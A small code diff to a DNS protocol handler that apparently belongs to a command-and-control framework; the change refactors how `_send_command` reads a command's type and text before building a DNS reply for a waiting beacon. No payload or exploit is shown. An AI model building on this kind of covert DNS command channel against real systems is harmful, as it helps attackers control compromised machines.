@@ -32,7 +32,8 @@ class DNSHandler(ProtocolHandler):
             self.logger.info("Incorrectly formatted DNS Query. Skipping")
     
     def _send_command(self, request, port, command):
-        opcode, cmd = command
+        opcode = command.type
+        cmd = command.command
         # get the type of record this beacon is ready to receive
         rr_type, rr_constructor = self.record_type.value
         # Generate skeleton question for packet
